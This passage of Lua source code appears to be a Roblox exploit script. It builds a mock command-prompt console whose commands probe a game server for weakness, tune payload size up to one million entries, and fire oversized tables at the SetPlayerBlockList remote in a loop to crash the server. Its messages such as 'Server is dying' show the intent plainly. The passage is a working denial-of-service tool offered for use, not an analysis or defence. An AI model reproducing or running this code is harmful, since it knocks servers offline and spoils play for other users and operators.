end)

-- ═══════════ COMMAND HANDLER ═══════════
local function processCommand(input)
    local cmd = string.lower(input)
    local args = string.split(cmd, " ")
    
    log("C:\\Users\\Admin> " .. input, Color3.fromRGB(255, 255, 255))
    
    if cmd == "!help" then
        log("Available Commands:", Color3.fromRGB(0, 255, 0))
        log("  !test           - Check if the server is vulnerable", Color3.fromRGB(0, 200, 255))
        log("  !crash          - Start the heavy payload", Color3.fromRGB(200, 200, 200))
        log("  !stop           - Stop the payload", Color3.fromRGB(200, 200, 200))
        log("  !limit          - Find max safe size (Tests up to 1M)", Color3.fromRGB(200, 200, 200))
        log("  !size <number>  - Set payload size (e.g. !size 180000)", Color3.fromRGB(200, 200, 200))
        log("  !ping           - Check server ping & advice", Color3.fromRGB(200, 200, 200))
        log("  !cls            - Clear screen", Color3.fromRGB(200, 200, 200))
        log("  !exit           - Close prompt", Color3.fromRGB(200, 200, 200))
        
    elseif cmd == "!test" then
        log("[*] Starting Server Vulnerability Test...", Color3.fromRGB(0, 200, 255))
        task.spawn(function()
            local remote = resolve()
            if not remote then 
                log("[!] Remote not found. Server is completely patched.", Color3.fromRGB(255, 50, 50)) 
                return 
            end
            
            local wasRunning = state.running
            if wasRunning then stopCrash() end
            
            local testSize = 100000
            log("[*] Firing " .. testSize .. " payload for 3 seconds...", Color3.fromRGB(200, 200, 200))
            
            local before = getPing()
            
            local p = {}
            for j = 1, testSize do
                p[j] = {id = j, v = j}
                if j % 10000 == 0 then task.wait() end
            end
            
            local endT = tick() + 3
            while tick() < endT do
                pcall(function() remote:FireServer(p) end)
                task.wait(0.125)
            end
            
            task.wait(2)
            local after = getPing()
            local spike = after - before
            
            log(string.format("[*] Baseline: %dms | After: %dms | Spike: %dms", before, after, spike), Color3.fromRGB(200, 200, 200))
            
            if spike > 150 or after > 500 then
                log("[+] VERDICT: SERVER IS VULNERABLE! It will crash.", Color3.fromRGB(0, 255, 0))
                log("[+] Type '!crash' to kill it.", Color3.fromRGB(0, 255, 0))
            else
                log("[-] VERDICT: SERVER IS PATCHED OR TOO STRONG.", Color3.fromRGB(255, 50, 50))
            end
            
            if wasRunning then startCrash() end
        end)
        
    elseif cmd == "!crash" then
        if state.running then
            log("[!] Payload is already running!", Color3.fromRGB(255, 200, 50))
        else
            startCrash()
            log("[+] Payload started. Targeting SetPlayerBlockList...", Color3.fromRGB(0, 255, 0))
            log("[+] Current Size: " .. tostring(Children) .. " | Burst: " .. tostring(FireBurst), Color3.fromRGB(0, 255, 0))
        end
        
    elseif cmd == "!stop" then
        if not state.running then
            log("[!] Payload is not running.", Color3.fromRGB(255, 200, 50))
        else
            stopCrash()
            log("[-] Payload stopped.", Color3.fromRGB(255, 50, 50))
        end
        
    elseif cmd == "!ping" then
        local p = getPing()
        log("[*] Current Server Ping: " .. p .. "ms", Color3.fromRGB(0, 200, 255))
        
        if state.running then
            if p > 1000 then
                log("[!] DANGER: Ping is above 1000ms. Error 261 kick imminent!", Color3.fromRGB(255, 50, 50))
            elseif p > 400 then
                log("[+] PERFECT LIMIT REACHED: Server is dying.", Color3.fromRGB(0, 255, 0))
            elseif p > 150 then
                log("[*] Server is lagging. Increase size slightly.", Color3.fromRGB(255, 200, 50))
            else
                log("[!] Server is ignoring payload. Increase size.", Color3.fromRGB(255, 200, 50))
            end
        end
        
    elseif cmd == "!limit" then
        log("[*] Starting Auto-Limit Test. Pushing up to 1,000,000...", Color3.fromRGB(0, 200, 255))
        task.spawn(function()
            local remote = resolve()
            if not remote then 
                log("[!] Remote not found. Cannot test limit.", Color3.fromRGB(255, 50, 50)) 
                return 
            end
            
            local wasRunning = state.running
            if wasRunning then stopCrash() end
            
            -- ✅ TESTING FROM 100K ALL THE WAY TO 1M
            local sizes = {100000, 200000, 300000, 400000, 500000, 600000, 700000, 800000, 900000, 1000000}
            local bestSize = 50000
            
            for _, sz in ipairs(sizes) do
                log("[*] Testing " .. sz .. " payload...", Color3.fromRGB(200, 200, 200))
                local before = getPing()
                
                -- Yield build so game doesn't freeze
                local p = {}
                for j = 1, sz do
                    p[j] = {id = j, v = j}
                    if j % 20000 == 0 then task.wait() end
                end
                
                local endT = tick() + 2.5
                while tick() < endT do
                    pcall(function() remote:FireServer(p) end)
                    task.wait(0.125)
                end
                
                task.wait(3) -- Wait 3 full seconds to let the ping settle
                local after = getPing()
                local spike = after - before
                
                log(string.format("[+] %d payload -> Spike: %dms (Total Ping: %dms)", sz, spike, after), Color3.fromRGB(0, 255, 0))
                
                -- Only stop if the ping is literally about to kick you (over 3500ms)
                if after > 3500 or spike > 3000 then
                    log("[!] DANGER: This size is starting to kick you! Stopping test.", Color3.fromRGB(255, 50, 50))
                    break
                else
                    bestSize = sz
                end
                task.wait(2) -- Cooldown before next test
            end
            
            Children = bestSize
            state.cache = nil
            
            log("[*] RECOMMENDED SAFE LIMIT FOR THIS SERVER: " .. bestSize, Color3.fromRGB(0, 200, 255))
            log("[*] Size automatically set. Type '!crash' to begin.", Color3.fromRGB(0, 200, 255))
            
            if wasRunning then startCrash() end
        end)
        
    elseif cmd == "!cls" then
        for _, v in ipairs(consoleFrame:GetChildren()) do
            if v:IsA("TextLabel") then v:Destroy() end
        end
        
    elseif cmd == "!exit" then
        screenGui:Destroy()
        
    elseif args[1] == "!size" then
        local num = tonumber(args[2])
        if num and num > 1000 then
            Children = math.floor(num)
            state.cache = nil
            log("[+] Payload size set to " .. tostring(Children), Color3.fromRGB(0, 255, 0))
        else
            log("[!] Invalid number. Example: !size 150000", Color3.fromRGB(255, 50, 50))
        end
        
    elseif cmd == "" then
        -- Do nothing
    else
        log("'" .. cmd .. "' is not recognized as an internal or external command,", Color3.fromRGB(255, 50, 50))
    end
end

inputBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        local text = inputBox.Text
        inputBox.Text = ""
        if text ~= "" then
            processCommand(text)
        end
    end
end)

-- ═══════════ LIVE STATUS LOGGING ═══════════
task.spawn(function()
    local lastPasses = 0
    while screenGui.Parent do
        task.wait(3)
        if state.running then
            local delta = state.passes - lastPasses
            local p = getPing()
            lastPasses = state.passes
            
            local pColor = Color3.fromRGB(120, 200, 120)
            if p > 800 then pColor = Color3.fromRGB(255, 50, 50) 
            elseif p > 300 then pColor = Color3.fromRGB(255, 200, 50) end
            
            log(string.format("[*] Status: %d fires/3s | Ping: %dms | Size: %d", delta, p, Children), pColor)
        end
    end
end)

